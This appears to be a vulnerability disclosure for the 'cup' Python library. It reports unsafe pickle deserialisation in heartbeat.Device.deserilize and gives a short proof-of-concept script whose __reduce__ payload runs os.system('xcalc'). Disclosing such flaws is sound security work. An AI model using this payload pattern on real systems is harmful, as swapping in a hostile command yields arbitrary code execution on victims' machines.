# Description
CUP, common useful python-lib. (Currently, Most popular python lib in baidu) 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install cup')
from cup.services import heartbeat
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
heartbeat.Device.deserilize(dumps,dumps)
```
* `pip3 install cup`
* `python3 exploit.py`
